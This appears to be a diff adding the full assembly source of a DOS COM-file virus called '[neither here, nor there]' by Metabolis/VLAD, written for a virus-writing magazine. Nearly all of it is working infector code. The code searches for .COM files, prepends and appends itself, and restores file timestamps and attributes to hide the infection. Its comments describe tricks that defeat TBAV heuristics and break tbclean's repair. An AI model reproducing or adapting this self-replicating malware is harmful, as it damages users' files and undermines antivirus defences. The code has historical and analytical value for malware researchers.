@@ -1,0 +1,231 @@
+
+; [neither here, nor there]
+; an app-pre-pender.
+;
+; by Metabolis/VLAD
+; thanks to Antigen for helping with bugs/optimizations
+;
+; "there was a time when there was nothing at all
+;  nothing at all, just a distant hum
+;  there was a being and he lived on his own
+;  he had no one to talk to, and nothing to do
+;
+;  he drew up the plans
+;  learnt to work with his hands
+;  a million years passed by
+;  and his work was done
+;
+;  and his words were these
+;
+;  hope you find it in everything
+;  everything that you seek
+;  hope you find it in everything
+;  everything that you seek
+;  hope you find it, hope you find it
+;  hope you find it new"
+;
+;  "hide and seek" - Howard Jones (bite me TU!)
+;
+; This virus will not spread at all, due to the fact that it's
+; direct action and has no real spreading methods such as path/
+; traversal dir infection.  The reason I wrote this was just to
+; see if I could get the app/pre part of it working, and of course
+; to get some code in the magazine which people who're the same
+; level as me can understand ;)  I guess you could call it a
+; laboratory specimen heh.
+;
+; 593 bytes when it infects
+;
+; features
+; - findfirst/findnext (woop!)
+; - relocated DTA (in a rather lame way hehe)
+; - killed tbav flags E,B and C (still scans as F)
+;   it would be too much hassle to remove F, so stuff it ;)
+; - checks if the infectee is the right size
+; - won't infect command.com
+; - won't infect com files which are really EXEs
+; - checks for previous infection
+; - restores original date, time and attributes
+; - since my virus prepends, tbclean shits itself
+;   and truncates the file you want to clean ;)
+
+        org     100h                            ; it's a com file ;)
+
+start:
+        call    $+3                             ; ok, here we get the
+next:   int     3h                              ; (kills TBAV heuristic)
+        pop     bp                              ; delta offset of the
+        sub     bp,offset next                  ; virus and plug it in bp
+        jmp     set_dta
+
+mask    db      '*.c?m',00h                     ; filemask for findfirst/fn
+infsize dw      back-middle                     ; infectee's filesize
+
+set_dta:
+
+        mov     ah,1ah                          ; set the dta to a little
+        mov     dx,0fae0h                       ; before the end of 64k
+        int     21h                             ; (enough room for buffer
+                                                ; and the tempdta)
+find_first:
+
+        lea     dx,[bp+offset mask]
+        mov     ah,4eh                          ; find first file
+        mov     cx,7                            ; with any attributes
+        int     21h
+        jc      goto_restore                    ; error?  no .com files
+        jmp     open_file                       ; we got one, let's check it
+
+find_next:
+
+        call    close_file                      ; make sure file is closed
+
+        mov     ah,4fh                          ; find next file
+        int     21h
+        jnc     open_file                       ; if no errors, open file
+
+goto_restore:
+
+        jmp     restore                         ; error, run original prog
+
+calculate_dx:
+
+        lea     dx,[bp+offset middle]           ; get offset middle
+        add     dx,word ptr [bp+infsize]        ; the size of infected file
+        add     dx,end-back                     ; add second half
+        ret
+
+close_file:
+
+        mov     ah,3eh                          ; close file
+        int     21h
+        ret
+
+open_file:
+
+        cmp     word ptr [0fae0h+1eh],'OC'      ; don't infect command.com
+        je      find_next
+
+        cmp     word ptr [0fae0h+1ah],1000      ; bah only infect files
+        jbe     find_next                       ; above 1000 bytes
+
+        cmp     word ptr [0fae0h+1ah],0fae0h    ; infect those which leave
+        jae     find_next                       ; enough space for buffer
+
+        mov     dx,0fae0h+1eh                   ; get filename to infect
+        mov     ax,4301h                        ; put normal attributes
+        mov     cx,20h                          ; on the file..
+        int     21h
+
+        mov     ax,3D02h                        ; open file for read/write
+        int     21h                             ; (filename still in dx)
+        jc      find_next                       ; error ? find another file
+        
+        xchg    bx,ax                           ; put file handle in BX
+
+        mov     cx,middle-start                 ; read front half to file
+        mov     ah,03fh                         ; first we must
+        call    calculate_dx
+        int     21h                             ; this is to point to the
+        push    dx                              ; buffer to read bytes to
+
+        mov     si,dx
+        mov     cx,word ptr si                  ; check if it's an EXE
+        add     cl,ch                           ; file we're about to
+        cmp     cl,167                          ; infect!
+        je      find_next
+                                                ; check if the file has
+        mov     ax,word ptr si                  ; already been infected
+        cmp     ax,000e8h                       ; so we're...
+        je      find_next                       ; looking for e800
+        mov     cx,word ptr [0fae0h+1ah]
+        mov     word ptr [bp+infsize],cx        ; write new infectee filesize
+
+        mov     ax,4200h                        ; lseek to begin of file
+        cwd                                     ; (xor dx,dx)
+        xor     cx,cx
+        int     21h
+
+        mov     cx,middle-start                 ; write the first half
+        mov     ah,40h                          ; of the virus to the start
+        lea     dx,[bp+offset start]            ; of the file
+        int     21h
+
+        mov     ax,4202h                        ; get to the end
+        cwd                                     ; of the file (xor dx,dx)
+        xor     cx,cx
+        int     21h
+
+        pop     dx                              ; write the
+        mov     cx,middle-start                 ; original top bytes
+        mov     ah,40h                          ; we will replace them later
+        int     21h
+
+        mov     cx,end-back                     ; write second half of
+        sub     dx,cx                           ; the virus to the end
+        mov     si,dx                           ; of the file
+        mov     ah,40h
+        int     21h
+
+        push    dx
+
+        xor     cx,cx
+        mov     cl,byte ptr [0fae0h+15h]        ; get old attr from DTA
+        mov     dx,0fae0h+1eh                   ; position of filename in DTA
+        mov     ax,4301h                        ; set attr to original
+        int     21h
+        mov     cx,0fae0h+16                    ; date and
+        mov     dx,es                           ; time
+        mov     ax,5701h                        ; set file date/time
+        int     21h
+
+        pop     dx
+    
+        jmp     after_restore
+                                                ; to the most beautiful
+sop     db      "I love you P, always will "    ; girl in the world,
+                                                ; if only things were
+restore:                                        ; different :(
+
+        call    calculate_dx                    ; this gives dx the address
+        sub     dx,end-back                     ; of the com's original
+                                                ; bytes which were at 100h
+after_restore:
+
+        call    close_file
+
+        jmp     dx                              ; jump to the second half
+                                                ; of our code.
+middle:
+
+        db      (middle-start) dup (?)          ; just some dummy shit
+        int     20h                             ; so it will quit after
+        db      (middle-start)-2 dup (?)        ; executing the first gen.
+
+back:
+
+; The virus isn't actually split in *half* technically, the only
+; code which is appended to the file is that which runs the original
+; infected program.  If I put anything else down the end here it
+; would've been hell to calculate all the offsets .. so this'll do me ;)
+
+        mov     cx,middle-start                 ; we want to write the bytes
+        mov     si,dx                           ; we wrote over at the start
+        sub     si,cx                           ; of the file to 100h so
+        mov     di,100h                         ; we can run it as usual
+        rep     movsb                           ; (funnily enough, that's
+        mov     ax,100h-1                       ; what this part does!)
+        inc     ax                              ; this will nuke a tbav
+        jmp     ax                              ; heuristic.. cool huh
+
+        db      " [neither here, nor there]"    ; virus name!
+        db      " Metabolis/VLAD"               ; author! (duh)
+
+end:
+
+fbuffer db      middle-start dup (?)            ; place to store the first
+                                                ; bit of the infectee when
+                                                ; overwriting it.
+
+; this virus was brought to you by the TBAV flags, C,B,E and F
+
